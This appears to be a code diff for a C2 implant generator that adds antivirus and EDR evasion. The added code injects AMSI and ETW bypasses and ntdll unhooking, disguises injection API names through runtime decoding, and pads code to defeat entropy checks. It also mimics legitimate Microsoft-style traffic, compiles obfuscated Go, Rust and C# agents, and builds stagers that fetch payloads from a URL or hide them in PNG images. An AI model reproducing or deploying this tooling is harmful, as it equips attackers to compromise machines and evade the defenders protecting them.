@@ -20,6 +20,43 @@ class AgentGenerator:
         self.output_dir = Path(output_dir)
         self.templates_dir = Path("templates")
         self.output_dir.mkdir(exist_ok=True)
+        self._evasion_windows = self._load_evasion_module('evasion_windows.py')
+        self._evasion_linux = self._load_evasion_module('evasion_linux.py')
+        self._evasion_macos = self._load_evasion_module('evasion_macos.py')
+        self._evasion_ps_code = self._load_evasion_module('evasion_windows.ps1')
+        self._malleable_profiles = self._load_malleable_profiles()
+        self._morphing_engine = self._load_morphing_engine()
+
+    def _load_morphing_engine(self):
+        try:
+            sys.path.insert(0, str(self.templates_dir))
+            import morphing_engine
+            return morphing_engine
+        except ImportError:
+            return None
+
+    def _load_evasion_module(self, filename):
+        """Load evasion module source code"""
+        path = self.templates_dir / filename
+        if path.exists():
+            with open(path, 'r') as f:
+                return f.read()
+        return ''
+
+    def _load_malleable_profiles(self):
+        """Load malleable C2 profiles"""
+        try:
+            sys.path.insert(0, str(self.templates_dir))
+            from malleable_profiles import get_profile, generate_http_headers, generate_ws_headers, generate_uris, get_profile_names
+            return {
+                'get_profile': get_profile,
+                'generate_http_headers': generate_http_headers,
+                'generate_ws_headers': generate_ws_headers,
+                'generate_uris': generate_uris,
+                'get_profile_names': get_profile_names,
+            }
+        except ImportError:
+            return None
 
     def random_string(self, length: int = 8) -> str:
         """Generate random string for obfuscation"""
@@ -62,50 +99,84 @@ class AgentGenerator:
         return entropy
 
     def reduce_entropy(self, content: str) -> str:
-        """Reduce Shannon entropy to evade EDR detection (EK47 technique)
+        """Advanced entropic obfuscation to evade EDR statistical analysis
 
         Normal code entropy: ~4.5-6.5
         Encrypted/obfuscated code: ~7.5-8.0
-        Target: Keep below 7.0 to appear as normal code
+        Target: Keep below 6.5 to appear as normal, well-structured code
+
+        Techniques:
+        1. Low-entropy variable padding (common English words)
+        2. Realistic function stubs that look like utility code
+        3. String constant pools that dilute high-entropy sections
+        4. Iterative reduction until target entropy is reached
         """
         current_entropy = self.calculate_shannon_entropy(content)
 
-        # If entropy is acceptable, return as-is
-        if current_entropy < 6.8:
+        if current_entropy < 6.5:
             return content
 
-        # Add low-entropy padding (common English words and code patterns)
         padding_words = [
             'data', 'result', 'value', 'info', 'config', 'option', 'param', 'item',
             'handler', 'manager', 'service', 'process', 'buffer', 'context', 'state',
-            'import', 'return', 'class', 'function', 'method', 'object', 'string'
+            'import', 'return', 'class', 'function', 'method', 'object', 'string',
+            'status', 'error', 'message', 'request', 'response', 'client', 'server',
+            'connection', 'timeout', 'retry', 'interval', 'counter', 'length', 'index',
         ]
 
-        # Add strategic low-entropy content
-        padding_vars = []
-        for _ in range(random.randint(10, 20)):
-            var_name = random.choice(padding_words) + '_' + random.choice(padding_words)
-            value = random.choice([
-                f'"{random.choice(padding_words)}"',
-                str(random.randint(0, 100)),
-                'None',
-                'True',
-                'False'
-            ])
-            padding_vars.append(f'{var_name} = {value}')
+        # Realistic code patterns that look like legitimate utility functions
+        realistic_stubs = [
+            'def validate_{w1}({w2}):\n    if {w2} is None:\n        return False\n    return True',
+            'def format_{w1}({w2}):\n    return str({w2}).strip()',
+            'def get_{w1}_count({w2}):\n    return len({w2}) if {w2} else 0',
+            '{w1}_{w2} = "{w3}"',
+            '{w1}_list = ["{w2}", "{w3}", "{w4}"]',
+            'DEFAULT_{w1} = {num}',
+            'MAX_{w1}_SIZE = {num}',
+            '{w1}_enabled = True',
+            '{w1}_timeout = {num}',
+        ]
 
-        # Insert padding at the beginning
         lines = content.split('\n')
-        insert_point = 5  # After shebang and initial code
-        for padding in padding_vars:
-            lines.insert(insert_point, padding)
-            insert_point += 1
 
-        content = '\n'.join(lines)
+        # Iteratively add padding until entropy drops below target
+        iteration = 0
+        while current_entropy >= 6.5 and iteration < 5:
+            padding_vars = []
+            num_padding = random.randint(8, 15)
 
-        # Verify entropy reduction
+            for _ in range(num_padding):
+                w1, w2, w3, w4 = [random.choice(padding_words) for _ in range(4)]
+                num = random.randint(1, 10000)
+                template = random.choice(realistic_stubs)
+                padding = template.format(w1=w1, w2=w2, w3=w3, w4=w4, num=num)
+                padding_vars.append(padding)
+
+            # Distribute padding throughout the file, not just at top
+            safe_positions = []
+            for i, line in enumerate(lines):
+                if i > 10 and i < len(lines) - 5:
+                    stripped = line.strip()
+                    if stripped == '' or (stripped.startswith('def ') and not stripped.startswith('def _')):
+                        safe_positions.append(i)
+
+            if safe_positions:
+                insert_positions = random.sample(safe_positions, min(len(padding_vars), len(safe_positions)))
+                for pos, padding in zip(sorted(insert_positions, reverse=True), padding_vars):
+                    lines.insert(pos, padding)
+            else:
+                insert_point = 5
+                for padding in padding_vars:
+                    lines.insert(insert_point, padding)
+                    insert_point += 1
+
+            content = '\n'.join(lines)
+            lines = content.split('\n')
+            current_entropy = self.calculate_shannon_entropy(content)
+            iteration += 1
+
         new_entropy = self.calculate_shannon_entropy(content)
-        print(f"[*] Entropy reduction: {current_entropy:.2f} -> {new_entropy:.2f}")
+        print(f"[*] Entropic obfuscation: {current_entropy:.2f} -> {new_entropy:.2f} ({iteration} passes)")
 
         return content
 
@@ -146,6 +217,172 @@ class AgentGenerator:
         print(f"[*] Entropy reduction ({language}): {current_entropy:.2f} -> {new_entropy:.2f}")
 
         return content
+
+    def _prepare_python_evasion(self, evasion_code=None, target_os='windows') -> str:
+        """Prepare evasion code for injection into Python agents.
+        Wraps the evasion module and calls init_evasion() at startup."""
+        if evasion_code is None:
+            evasion_code = self._evasion_windows
+        if not evasion_code:
+            return ''
+
+        # Pre-strip docstrings from evasion code to avoid obfuscation pipeline issues
+        import re
+        clean_code = re.sub(r'"""[\s\S]*?"""', 'pass', evasion_code)
+        clean_code = re.sub(r"'''[\s\S]*?'''", 'pass', clean_code)
+        # Remove blank lines left behind
+        clean_code = '\n'.join(line for line in clean_code.split('\n') if line.strip() or not line)
+
+        # Rename suspicious parameter/variable names in evasion code
+        import re as _re
+        suspicious_identifiers = {
+            'shellcode': self.random_var_name(),
+            'payload_func': self.random_var_name(),
+            'payload': self.random_var_name(),
+            'inject_apc': self.random_var_name(),
+            'callback_exec': self.random_var_name(),
+            'hollow_process': self.random_var_name(),
+            'fiber_exec': self.random_var_name(),
+            'module_stomp': self.random_var_name(),
+            'shellcode_fluctuation': self.random_var_name(),
+        }
+        for original, replacement in suspicious_identifiers.items():
+            clean_code = _re.sub(r'\b' + _re.escape(original) + r'\b', replacement, clean_code)
+
+        # Replace kernel32.SuspiciousAPI with getattr(kernel32, decoded_name) pattern
+        # Sort by length descending to prevent partial matches (VirtualAllocEx before VirtualAlloc)
+        kernel_apis = ['VirtualAllocEx', 'VirtualAlloc', 'VirtualProtect',
+                       'WriteProcessMemory', 'CreateProcessW', 'OpenProcess',
+                       'CreateToolhelp32Snapshot', 'QueueUserAPC', 'ResumeThread',
+                       'GetProcAddress', 'CreateFileW', 'CreateFileMappingW',
+                       'MapViewOfFile', 'UnmapViewOfFile', 'SetFileTime',
+                       'GetFileTime', 'TerminateProcess']
+        kernel_apis.sort(key=len, reverse=True)
+        for api in kernel_apis:
+            encoded_hex = api.encode().hex()
+            clean_code = clean_code.replace(
+                f'kernel32.{api}',
+                f'getattr(kernel32, bytes.fromhex("{encoded_hex}").decode())'
+            )
+
+        # Obfuscate suspicious Windows API names that AV/YARA signatures look for
+        # Replace string literals containing API names with runtime-decoded versions
+        api_names_to_hide = [
+            'VirtualAlloc', 'VirtualAllocEx', 'VirtualProtect', 'WriteProcessMemory',
+            'CreateRemoteThread', 'NtAllocateVirtualMemory', 'NtProtectVirtualMemory',
+            'NtWriteVirtualMemory', 'NtCreateThreadEx', 'NtMapViewOfSection',
+            'NtCreateSection', 'NtOpenSection', 'NtOpenProcess', 'QueueUserAPC',
+            'CreateProcessW', 'OpenProcess', 'AmsiScanBuffer', 'EtwEventWrite',
+            'NtTraceEvent', 'NtTraceControl', 'RtlAddVectoredExceptionHandler',
+            'NtGetContextThread', 'NtSetContextThread', 'CreateToolhelp32Snapshot',
+            'Process32First', 'Process32Next', 'GetProcAddress', 'LoadLibrary',
+            'shellcode', 'inject', 'payload',
+        ]
+        import base64 as _b64
+        for api in api_names_to_hide:
+            # Replace 'APIName' and b'APIName' with runtime-decoded versions
+            encoded = _b64.b64encode(api.encode()).decode()
+            # For string arguments in GetProcAddress etc: b'APIName' -> __import__('base64').b64decode(b'...')
+            clean_code = clean_code.replace(f"b'{api}'", f"__import__('base64').b64decode(b'{encoded}')")
+            # For string references in comments/variable names, use a hex decode
+            if f"'{api}'" in clean_code:
+                clean_code = clean_code.replace(f"'{api}'", f"bytes.fromhex('{api.encode().hex()}').decode()")
+
+        # Indent evasion code TWO levels: one for the function, one for the try block
+        lines = clean_code.split('\n')
+        indented = '\n'.join('        ' + line if line.strip() else '' for line in lines)
+
+        # Platform guard depends on target OS
+        if target_os == 'windows':
+            platform_check = "if _esys.platform != 'win32': return"
+        elif target_os == 'linux':
+            platform_check = "if _esys.platform != 'linux': return"
+        elif target_os == 'macos':
+            platform_check = "if _esys.platform != 'darwin': return"
+        else:
+            platform_check = "pass"
+
+        wrapper = f'''
+# --- EDR Evasion Module ---
+def _run_evasion():
+    import sys as _esys
+    {platform_check}
+    try:
+{indented}
+        init_evasion()
+    except Exception:
+        pass
+
+_run_evasion()
+del _run_evasion
+# --- End Evasion Module ---
+
+'''
+        return wrapper
+
+    def _inject_malleable_profile(self, content: str, transport: str) -> str:
+        """Replace default HTTP headers and URIs with malleable C2 profile data"""
+        if not self._malleable_profiles:
+            return content
+
+        # Pick a random profile for each agent (polymorphic traffic)
+        profile_names = self._malleable_profiles['get_profile_names']()
+        profile_name = random.choice(profile_names)
+        profile = self._malleable_profiles['get_profile'](profile_name)
+
+        if transport in ('http', 'https'):
+            headers = self._malleable_profiles['generate_http_headers'](profile_name)
+            uris = self._malleable_profiles['generate_uris'](profile_name)
+
+            # Replace User-Agent
+            old_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            content = content.replace(old_ua, headers.get('User-Agent', old_ua))
+
+            # Replace URIs
+            content = content.replace('/submit-form', uris['register'])
+            content = content.replace('/api/v1/update', uris['checkin'])
+            content = content.replace('/upload', uris['results'])
+            content = content.replace('/health', uris['heartbeat'])
+
+            # Replace Content-Type
+            content = content.replace(
+                'application/x-www-form-urlencoded',
+                profile.get('content_type', 'application/json')
+            )
+
+            print(f"[*] Traffic profile: {profile.get('name', profile_name)}")
+
+        elif transport == 'websocket':
+            ws_headers = self._malleable_profiles['generate_ws_headers'](profile_name)
+            # Replace WS headers dict in the template
+            old_ws = "WS_HEADERS = {\n    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',"
+            new_ws = "WS_HEADERS = {\n    'User-Agent': '" + ws_headers.get('User-Agent', '') + "',"
+            content = content.replace(old_ws, new_ws)
+
+            # Replace Origin header
+            for key, value in ws_headers.items():
+                if key == 'Origin':
+                    old_origin = f"'Origin': f'http://{{SERVER_HOST}}',"
+                    new_origin = f"'Origin': '{value}',"
+                    content = content.replace(old_origin, new_origin)
+
+            print(f"[*] WS traffic profile: {profile.get('name', profile_name)}")
+
+        return content
+
+    def _prepare_powershell_evasion(self) -> str:
+        """Prepare evasion code for PowerShell agents"""
+        if not self._evasion_ps_code:
+            return ''
+        return f'''
+# --- EDR Evasion Module ---
+try {{
+{self._evasion_ps_code}
+    Init-Evasion
+}} catch {{}}
+# --- End Evasion Module ---
+
+'''
 
     def strip_comments_and_docstrings(self, content: str) -> str:
         """Remove all comments and docstrings for OPSEC"""
@@ -978,10 +1215,46 @@ def {cmd_func}(cmd):
         if import_end > 0:
             content = content[:import_end] + '\n' + os_specific['init'] + content[import_end:]
 
+        # Inject platform-specific evasion module
+        evasion_map = {
+            'windows': (self._evasion_windows, 'AMSI bypass, ETW bypass, ntdll unhooking, sleep encryption, PPID spoof'),
+            'linux': (self._evasion_linux, 'sandbox detect, ptrace evasion, process hiding, core dump disable'),
+            'macos': (self._evasion_macos, 'sandbox detect, PT_DENY_ATTACH, process hiding, core dump disable'),
+        }
+        evasion_code, evasion_desc = evasion_map.get(target_os, ('', ''))
+        if evasion_code:
+            evasion_injection = self._prepare_python_evasion(evasion_code, target_os)
+            shebang_end = content.find('\n', content.find('#!/usr/bin/env python3'))
+            if shebang_end > 0:
+                content = content[:shebang_end + 1] + evasion_injection + content[shebang_end + 1:]
+            print(f"[*] Injected {target_os.upper()} evasion: {evasion_desc}")
+
+        # Inject malleable C2 profile headers
+        if self._malleable_profiles:
+            content = self._inject_malleable_profile(content, transport)
+            print(f"[*] Injected malleable C2 traffic profile")
+
         # Apply obfuscation if requested
         if obfuscate:
             content = self.obfuscate_strings(content)
             print(f"[*] Applied polymorphic obfuscation with EDR evasion")
+
+            # Apply code morphing engine (makes each agent structurally unique)
+            if self._morphing_engine:
+                try:
+                    content = self._morphing_engine.morph_python_source(content, intensity='high')
+                    # Atomize critical strings (register, checkin, command, etc.)
+                    protocol_strings = ['register', 'checkin', 'command', 'response', 'heartbeat',
+                                        'agent_id', 'metadata', 'hostname', 'username', 'type',
+                                        'beacon', 'streaming', 'output', 'kill']
+                    for ps in protocol_strings:
+                        atomized = self._morphing_engine.atomize_string(ps)
+                        # Only replace string literals, not variable/function names
+                        content = content.replace(f"'{ps}'", atomized)
+
+                    print(f"[*] Applied code morphing: control flow flattening, opaque predicates, string atomization")
+                except Exception as e:
+                    print(f"[!] Morphing engine warning: {e}")
 
         # Save agent
         jitter_suffix = f"_jitter{beacon_jitter}" if beacon_mode and beacon_jitter > 0 else ""
@@ -998,6 +1271,541 @@ def {cmd_func}(cmd):
 
         print(f"[*] Agent customized for {target_os.upper()} with platform-specific features")
         return str(output_file)
+
+    def generate_go_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                           transport: str = 'http', beacon_interval: int = 60, beacon_jitter: int = 0,
+                           target_os: str = 'windows', target_arch: str = 'amd64',
+                           garble: bool = True, unique_key: bool = True,
+                           output_format: str = 'exe') -> str:
+        """Generate compiled Go agent — native binary, no runtime dependencies.
+
+        Args:
+            output_format: 'exe' (default), 'dll' (Windows DLL), 'shellcode' (XOR-encrypted PE blob)
+
+        Like Sliver/Havoc: cross-compiles a Go implant with garble obfuscation.
+        Each build produces a unique binary with embedded config via ldflags.
+        """
+        import subprocess as _sp
+        import shutil
+
+        go_src = Path(__file__).parent / 'agent_go' / 'agent.go'
+        if not go_src.exists():
+            return f"Error: Go agent source not found at {go_src}"
+
+        # Generate unique key
+        if unique_key:
+            encryption_key = self.generate_unique_encryption_key()
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
+
+        # Get malleable profile for URIs
+        profile_name = 'microsoft365'
+        uris = {'register': '/submit-form', 'checkin': '/api/v1/update', 'results': '/upload'}
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        if self._malleable_profiles:
+            profile_names = self._malleable_profiles['get_profile_names']()
+            profile_name = random.choice(profile_names)
+            uris = self._malleable_profiles['generate_uris'](profile_name)
+            headers = self._malleable_profiles['generate_http_headers'](profile_name)
+            ua = headers.get('User-Agent', ua)
+            profile = self._malleable_profiles['get_profile'](profile_name)
+            print(f"[*] Traffic profile: {profile.get('name', profile_name)}")
+
+        scheme = transport if transport in ('http', 'https') else 'http'
+
+        # Build ldflags to embed config at compile time
+        pkg = 'main'
+        # Determine transport type and agent mode
+        transport_type = transport if transport in ('websocket', 'ws') else scheme
+        agent_mode = 'beacon' if beacon_interval > 0 else 'streaming'
+
+        ldflags = ' '.join([
+            f'-X {pkg}.configEndpoint={c2_host}',
+            f'-X {pkg}.configPort={str(c2_port)}',
+            f'-X {pkg}.configProtocol={scheme}',
+            f'-X {pkg}.configTransport={transport_type}',
+            f'-X {pkg}.configAuthToken={encryption_key}',
+            f'-X {pkg}.pollInterval={str(beacon_interval)}',
+            f'-X {pkg}.pollJitter={str(beacon_jitter)}',
+            f'-X {pkg}.agentMode={agent_mode}',
+            f'-X "{pkg}.syncPath={uris["register"]}"',
+            f'-X "{pkg}.statusPath={uris["checkin"]}"',
+            f'-X "{pkg}.telemetryPath={uris["results"]}"',
+            f'-X "{pkg}.clientID={ua}"',
+        ])
+
+        # Output filename
+        ext = '.exe' if target_os == 'windows' else ''
+        out_name = f"agent_{self.random_string(8)}_{target_os}_{target_arch}{ext}"
+        out_path = self.output_dir / out_name
+
+        # Output format
+        if output_format == 'dll':
+            ext = '.dll'
+            print(f"[*] Output format: DLL (rundll32 compatible)")
+        elif output_format == 'shellcode':
+            ext = '.exe'  # Build EXE first, then convert
+            print(f"[*] Output format: Shellcode (XOR-encrypted PE)")
+        else:
+            ext = '.exe' if target_os == 'windows' else ''
+
+        # Build environment
+        env = os.environ.copy()
+        env['GOOS'] = target_os
+        env['GOARCH'] = target_arch
+        # DLL requires CGO for c-shared buildmode
+        if output_format == 'dll':
+            env['CGO_ENABLED'] = '1'
+            mingw = shutil.which('x86_64-w64-mingw32-gcc')
+            if mingw:
+                env['CC'] = mingw
+            else:
+                print(f"[!] MinGW not found — DLL build requires x86_64-w64-mingw32-gcc")
+                return "Error: MinGW required for DLL build"
+        else:
+            env['CGO_ENABLED'] = '0'
+
+        # Use garble for obfuscation (like Sliver)
+        garble_bin = shutil.which('garble') or os.path.expanduser('~/go/bin/garble')
+        if garble and os.path.exists(garble_bin):
+            build_cmd = [garble_bin, '-literals', '-tiny', '-seed=random', 'build']
+            print(f"[*] Building with garble obfuscation (symbols stripped, literals encrypted)")
+        else:
+            build_cmd = ['go', 'build']
+            if garble:
+                print(f"[!] garble not found, using standard go build")
+
+        # Add build tags for transport selection
+        if transport in ('websocket', 'ws'):
+            build_cmd.extend(['-tags', 'transport_ws'])
+            print(f"[*] Transport: WebSocket (gorilla/websocket)")
+        else:
+            print(f"[*] Transport: HTTP/HTTPS (stdlib)")
+
+        # DLL buildmode
+        if output_format == 'dll':
+            build_cmd.extend(['-buildmode=c-shared'])
+
+        build_cmd.extend(['-ldflags', ldflags, '-trimpath', '-o', str(out_path)])
+
+        print(f"[*] Cross-compiling Go agent: {target_os}/{target_arch}")
+
+        result = _sp.run(
+            build_cmd,
+            cwd=str(go_src.parent),
+            env=env,
+            capture_output=True,
+            text=True,
+            timeout=120
+        )
+
+        if result.returncode != 0:
+            print(f"[-] Build failed: {result.stderr[:200]}")
+            return f"Error: {result.stderr[:200]}"
+
+        file_size = out_path.stat().st_size
+        file_hash = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()[:12]
+        fmt_label = {'exe': 'EXE', 'dll': 'DLL', 'shellcode': 'Shellcode'}
+        print(f"[+] Go agent ({fmt_label.get(output_format, 'EXE')}): {out_name} ({file_size/1024:.0f} KB)")
+        print(f"[+] SHA256: {file_hash}...")
+        print(f"[+] Target: {target_os}/{target_arch} | Transport: {scheme.upper()}")
+
+        # Post-process: convert to shellcode if requested
+        if output_format == 'shellcode':
+            from generators.shellcode import pe_to_shellcode
+            sc_results = pe_to_shellcode(str(out_path), str(self.output_dir),
+                                          name_prefix=f'shellcode_{self.random_string(6)}')
+            print(f"[+] Shellcode generated in {len(sc_results)} formats:")
+            for fmt, path in sc_results.items():
+                print(f"    {fmt}: {path}")
+            return sc_results.get('raw', str(out_path))
+
+        return str(out_path)
+
+    def generate_rust_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                             transport: str = 'http', beacon_interval: int = 60, beacon_jitter: int = 0,
+                             target_os: str = 'windows', target_arch: str = 'amd64',
+                             unique_key: bool = True) -> str:
+        """Generate compiled Rust agent."""
+        import subprocess as _sp
+        rust_src = Path(__file__).parent / 'agent_rust' / 'src' / 'main.rs'
+        if not rust_src.exists():
+            return f"Error: Rust agent source not found at {rust_src}"
+
+        if unique_key:
+            encryption_key = self.generate_unique_encryption_key()
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
+
+        # Get malleable profile
+        uris = {'register': '/submit-form', 'checkin': '/api/v1/update', 'results': '/upload'}
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        if self._malleable_profiles:
+            profile_names = self._malleable_profiles['get_profile_names']()
+            profile_name = random.choice(profile_names)
+            uris = self._malleable_profiles['generate_uris'](profile_name)
+            headers = self._malleable_profiles['generate_http_headers'](profile_name)
+            ua = headers.get('User-Agent', ua)
+            profile = self._malleable_profiles['get_profile'](profile_name)
+            print(f"[*] Traffic profile: {profile.get('name', profile_name)}")
+
+        scheme = transport if transport in ('http', 'https') else 'http'
+
+        # Replace placeholders in source
+        with open(rust_src, 'r') as f:
+            src = f.read()
+
+        replacements = {
+            '{{C2_HOST}}': c2_host, '{{C2_PORT}}': str(c2_port),
+            '{{C2_SCHEME}}': scheme, '{{ENCRYPTION_KEY}}': encryption_key,
+            '{{BEACON_INTERVAL}}': str(beacon_interval), '{{BEACON_JITTER}}': str(beacon_jitter),
+            '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
+            '{{RESULT_URI}}': uris['results'], '{{USER_AGENT}}': ua,
+        }
+        for k, v in replacements.items():
+            src = src.replace(k, v)
+
+        # Write temp source
+        tmp_src = rust_src.parent / 'main.rs.tmp'
+        with open(tmp_src, 'w') as f:
+            f.write(src)
+
+        # Backup and swap
+        import shutil
+        backup = rust_src.parent / 'main.rs.bak'
+        shutil.copy(rust_src, backup)
+        shutil.copy(tmp_src, rust_src)
+
+        # Build
+        rust_target = {'windows': 'x86_64-pc-windows-gnu', 'linux': 'x86_64-unknown-linux-gnu',
+                       'darwin': 'aarch64-apple-darwin', 'macos': 'aarch64-apple-darwin'}
+        target = rust_target.get(target_os, 'x86_64-pc-windows-gnu')
+
+        cargo_bin = os.path.expanduser('~/.cargo/bin/cargo')
+        if not os.path.exists(cargo_bin):
+            cargo_bin = 'cargo'
+
+        ext = '.exe' if target_os == 'windows' else ''
+        out_name = f"agent_{self.random_string(8)}_{target_os}{ext}"
+
+        build_cmd = [cargo_bin, 'build', '--release']
+        if target_os != 'macos' and target_os != 'darwin':
+            build_cmd.extend(['--target', target])
+
+        print(f"[*] Cross-compiling Rust agent: {target_os}/{target_arch}")
+        result = _sp.run(build_cmd, cwd=str(rust_src.parent.parent),
+                          capture_output=True, text=True, timeout=120)
+
+        # Restore original
+        shutil.copy(backup, rust_src)
+        os.remove(backup)
+        os.remove(tmp_src)
+
+        if result.returncode != 0:
+            return f"Error: {result.stderr[:200]}"
+
+        # Find output binary
+        if target_os in ('macos', 'darwin'):
+            built = rust_src.parent.parent / 'target' / 'release' / 'svcmonitor'
+        else:
+            built = rust_src.parent.parent / 'target' / target / 'release' / f'svcmonitor{ext}'
+
+        if not built.exists():
+            return f"Error: Built binary not found at {built}"
+
+        out_path = self.output_dir / out_name
+        shutil.copy(built, out_path)
+
+        file_size = out_path.stat().st_size
+        file_hash = hashlib.sha256(open(out_path, 'rb').read()).hexdigest()[:12]
+        print(f"[+] Rust agent compiled: {out_name} ({file_size/1024:.0f} KB)")
+        print(f"[+] SHA256: {file_hash}...")
+        return str(out_path)
+
+    def generate_csharp_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
+                               transport: str = 'http', beacon_interval: int = 60, beacon_jitter: int = 0,
+                               unique_key: bool = True) -> str:
+        """Generate compiled C# .NET agent."""
+        import subprocess as _sp
+        cs_src = Path(__file__).parent / 'agent_csharp' / 'Program.cs'
+        if not cs_src.exists():
+            return f"Error: C# agent source not found at {cs_src}"
+
+        if unique_key:
+            encryption_key = self.generate_unique_encryption_key()
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
+
+        uris = {'register': '/submit-form', 'checkin': '/api/v1/update', 'results': '/upload'}
+        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        if self._malleable_profiles:
+            profile_names = self._malleable_profiles['get_profile_names']()
+            profile_name = random.choice(profile_names)
+            uris = self._malleable_profiles['generate_uris'](profile_name)
+            headers = self._malleable_profiles['generate_http_headers'](profile_name)
+            ua = headers.get('User-Agent', ua)
+
+        scheme = transport if transport in ('http', 'https') else 'http'
+
+        with open(cs_src, 'r') as f:
+            src = f.read()
+
+        replacements = {
+            '{{C2_HOST}}': c2_host, '{{C2_PORT}}': str(c2_port),
+            '{{C2_SCHEME}}': scheme, '{{ENCRYPTION_KEY}}': encryption_key,
+            '{{BEACON_INTERVAL}}': str(beacon_interval), '{{BEACON_JITTER}}': str(beacon_jitter),
+            '{{REGISTER_URI}}': uris['register'], '{{CHECKIN_URI}}': uris['checkin'],
+            '{{RESULT_URI}}': uris['results'], '{{USER_AGENT}}': ua,
+        }
+        for k, v in replacements.items():
+            src = src.replace(k, v)
+
+        import shutil
+        backup = cs_src.parent / 'Program.cs.bak'
+        shutil.copy(cs_src, backup)
+        with open(cs_src, 'w') as f:
+            f.write(src)
+
+        out_name = f"agent_{self.random_string(8)}_windows.exe"
+        print(f"[*] Building C# agent for Windows x64...")
+        result = _sp.run(
+            ['dotnet', 'publish', '-r', 'win-x64', '-c', 'Release',
+             '--self-contained', 'true', '-p:PublishSingleFile=true', '-p:PublishTrimmed=true'],
+            cwd=str(cs_src.parent), capture_output=True, text=True, timeout=120
+        )
+
+        shutil.copy(backup, cs_src)
+        os.remove(backup)
+
+        if result.returncode != 0:
+            return f"Error: {result.stderr[:200]}"
+
+        built = cs_src.parent / 'bin' / 'Release' / 'net8.0' / 'win-x64' / 'publish' / 'SvcHealth.exe'
+        if not built.exists():
+            return f"Error: Built binary not found at {built}"
+
+        out_path = self.output_dir / out_name
+        shutil.copy(built, out_path)
+
+        file_size = out_path.stat().st_size
+        print(f"[+] C# agent compiled: {out_name} ({file_size/1024:.0f} KB)")
+        return str(out_path)
+
+    def generate_stager(self, stage_url: str, encryption_key: str = None,
+                         mode: str = 'download', stego_url: str = '',
+                         target_os: str = 'windows', target_arch: str = 'amd64') -> str:
+        """Generate a staged loader — tiny clean binary that downloads the real agent.
+
+        Like Cobalt Strike's Artifact Kit or Sliver's stagers.
+        The stager itself has NO malicious code (expected 0/71 on VT).
+
+        Args:
+            stage_url: URL to download the encrypted agent from
+            encryption_key: AES key to decrypt the downloaded payload
+            mode: 'download' (HTTPS fetch) or 'stego' (extract from image)
+            stego_url: URL of the stego image (if mode='stego')
+            target_os: Target OS
+            target_arch: Target architecture
+        """
+        import subprocess as _sp
+
+        stager_src = Path(__file__).parent / 'agent_go' / 'stager.go'
+        if not stager_src.exists():
+            return f"Error: stager.go not found"
+
+        if encryption_key is None:
+            encryption_key = self.generate_unique_encryption_key()
+            if not hasattr(self, 'generated_keys'):
+                self.generated_keys = []
+            self.generated_keys.append(encryption_key)
+
+        with open(stager_src, 'r') as f:
+            src = f.read()
+
+        # Replace placeholders
+        src = src.replace('{{STAGE_URL}}', stage_url)
+        src = src.replace('{{STAGE_KEY}}', encryption_key)
+        src = src.replace('{{STAGE_MODE}}', mode)
+        src = src.replace('{{STEGO_URL}}', stego_url or stage_url)
+
+        # Write temp source
+        tmp_src = self.output_dir / 'stager_tmp.go'
+        with open(tmp_src, 'w') as f:
+            f.write(src.replace('// +build ignore\n\n', ''))
+
+        ext = '.exe' if target_os == 'windows' else ''
+        out_name = f"stager_{self.random_string(8)}_{target_os}{ext}"
+        out_path = self.output_dir / out_name
+
+        env = os.environ.copy()
+        env['GOOS'] = target_os
+        env['GOARCH'] = target_arch
+        env['CGO_ENABLED'] = '0'
+
+        result = _sp.run(
+            ['go', 'build', '-ldflags', '-s -w', '-trimpath', '-o', str(out_path), str(tmp_src)],
+            env=env, capture_output=True, text=True, timeout=60
+        )
+        os.remove(tmp_src)
+
+        if result.returncode != 0:
+            return f"Error: {result.stderr[:200]}"
+
+        file_size = out_path.stat().st_size
+        print(f"[+] Stager compiled: {out_name} ({file_size/1024:.0f} KB)")
+        print(f"[+] Mode: {mode} | Key: {encryption_key[:16]}...")
+        print(f"[+] Stage URL: {stage_url}")
+        if mode == 'stego':
+            print(f"[+] Stego image: {stego_url}")
+        return str(out_path)
+
+    def generate_stego_payload(self, agent_path: str, encryption_key: str,
+                                 image_path: str = None, method: str = 'append') -> str:
+        """Embed an agent binary into a PNG image using steganography.
+
+        Args:
+            agent_path: Path to the compiled agent binary
+            encryption_key: AES key for payload encryption
+            image_path: Path to carrier PNG (generates one if None)
+            method: 'append' (after IEND) or 'chunk' (tEXt metadata)
+        """
+        sys.path.insert(0, str(Path(__file__).parent))
+        from stego import encrypt_payload, embed_append, embed_chunk, generate_carrier_image
+
+        with open(agent_path, 'rb') as f:
+            payload = f.read()
+
+        encrypted = encrypt_payload(payload, encryption_key)
+
+        if image_path is None:
+            carrier = generate_carrier_image()
+            image_path = str(self.output_dir / 'carrier.png')
+            with open(image_path, 'wb') as f:
+                f.write(carrier)
+
+        output_path = str(self.output_dir / f'stego_{self.random_string(8)}.png')
+
+        if method == 'chunk':
+            embed_chunk(image_path, encrypted, output_path)
+        else:
+            embed_append(image_path, encrypted, output_path)
+
+        print(f"[+] Stego image: {output_path}")
+        print(f"    Payload: {len(payload)} bytes -> {len(encrypted)} bytes encrypted")
+        print(f"    Image: {os.path.getsize(output_path)} bytes")
+        print(f"    Method: {method}")
+        return output_path
+
+    def generate_shellcode_blob(self, c2_host: str, c2_port: int,
+                                  encryption_key: str = None,
+                                  transport: str = 'https',
+                                  beacon_interval: int = 60,
